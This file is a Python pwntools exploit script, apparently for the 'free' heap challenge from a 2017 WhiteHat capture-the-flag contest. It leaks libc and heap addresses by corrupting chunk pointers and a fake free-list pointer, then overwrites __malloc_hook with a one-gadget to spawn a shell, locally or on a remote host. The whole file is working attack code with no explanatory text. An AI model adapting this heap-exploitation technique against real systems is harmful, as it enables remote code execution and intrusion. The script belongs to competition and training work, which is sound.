#!/usr/bin/env python

from pwn import *
import sys

def addChunk(size, content):
    r.sendlineafter("choice:", "1")
    r.sendlineafter("of chunk:", str(size))
    r.sendafter("the chunk:", content)

def editChunk(idx, content):
    r.sendlineafter("choice:", "2") 
    r.sendlineafter("Index:", str(idx))
    r.sendafter("the chunk:", content)

def showChunk(idx):
    r.sendlineafter("choice:", "3") 
    r.sendlineafter("Index:", str(idx)) 
    return r.recvuntil("---")

def information(change, name):
    r.sendlineafter("choice:", "4") 
    r.sendlineafter("0.no)", str(change))
    if change: 
        r.sendafter("name:", name) 

def exit():
    r.sendlineafter("choice:", "5") 

def exploit(r):
    name = "A"
    r.sendlineafter("name?", name)
    
    age = 1337
    r.sendlineafter("age?", str(age))

    information(1, "A"*0x21)
    information(1, "\0")
    information(8, p64(0x602080)) # fake FD ptr
    
    addChunk(0x21, "B")
    addChunk(0x31, "C") 
    addChunk(0x28, p64(0x2000)*5)
    
    payload  = p64(0x2000)*14
    payload += p64(0x602020) # for libc leak
    payload += p64(0x602050) # for heap leak
    payload += p64(0x602100) # for easy access to overwrite chunks
    
    editChunk(2,payload)

    libc_base = u64(showChunk(0)[0:6].ljust(8,'\0'))-0x3c5620
    heap_base = u64(showChunk(1)[0:3].ljust(8,'\0'))-0x10
    malloc_hook = libc_base+0x3c4b10
    one_shot = libc_base+0xf0274

    log.success("libc_base found at "+hex(libc_base))
    log.success("heap_base found at "+hex(heap_base))
    log.success("malloc_hook found at "+hex(malloc_hook))
    log.success("one_shot found at "+hex(one_shot))
    
    editChunk(2, p64(malloc_hook))
    editChunk(0, p64(one_shot))
   
    information(1, "\0")
    information(1, "\0")
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/whitehatctf17/free/free'], env={"LD_PRELOAD":""})
        r = process(['/home/vagrant/CTFs/whitehatctf17/free/free'], env={"LD_PRELOAD":"./libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)
